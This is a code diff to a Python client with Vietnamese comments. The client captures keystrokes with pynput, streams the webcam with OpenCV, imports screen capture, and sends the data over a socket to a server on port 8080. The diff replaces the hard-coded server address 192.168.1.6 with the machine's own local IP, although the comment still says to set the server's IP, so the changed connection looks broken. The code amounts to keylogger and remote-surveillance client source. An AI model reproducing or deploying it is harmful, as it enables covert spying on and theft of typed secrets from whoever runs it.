@@ -5,6 +5,20 @@ import mss
 import numpy as np
 from pynput import keyboard
 
+def get_local_ip():
+    # Tạo một socket kết nối theo giao thức UDP
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        # Không cần kết nối thật, chỉ cần trỏ tới một IP bất kỳ (ví dụ IP này không tồn tại)
+        # Hệ điều hành sẽ tự động xác định IP nội bộ (LAN) tốt nhất để đi ra ngoài
+        s.connect(('10.255.255.255', 1))
+        IP = s.getsockname()[0]
+    except Exception:
+        IP = '127.0.0.1' # Fallback về localhost nếu không có mạng
+    finally:
+        s.close()
+    return IP
+
 def stream_webcam(client_socket):
     print('Bắt đầu stream webcam...')
     cap = cv2.VideoCapture(0)
@@ -68,8 +82,9 @@ def on_press(client_socket, key):
         send_data(client_socket, f" [{key.name}] ")
 
 # --- PHẦN LUỒNG CHÍNH CỦA CLIENT ---
+CLIENT_IP = get_local_ip()
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.connect(('192.168.1.6', 8080))  # Hãy đổi IP này thành IP máy server của bạn
+client.connect((CLIENT_IP, 8080))  # Hãy đổi IP này thành IP máy server của bạn
 
 client.send(b'Hello from client!')
 message = client.recv(1024).decode()
